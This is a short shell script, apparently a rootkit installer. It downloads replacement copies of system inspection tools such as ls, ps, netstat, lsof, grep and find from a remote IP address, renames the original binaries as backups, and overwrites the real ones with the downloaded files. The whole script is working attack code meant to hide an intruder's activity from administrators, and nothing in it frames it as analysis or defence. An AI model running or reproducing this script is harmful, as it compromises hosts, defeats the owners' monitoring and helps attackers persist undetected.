mkdir /tmp/wvikdlas 
cd /tmp/wvikdlas
for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service' 'cat'
do
	curl http://10.84.2.16/'.'$i -o $i
done

for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'find' 'service' 'cat'
do
	chmod +x $i
	a="`which $i`"wvikdlas
	j="${a/$i/wvikdlas$i}"
	z="`which cp`"
	b="`which $i`"
	$z $b $j
	$z './'$i $b
	rm -f ./$i
done
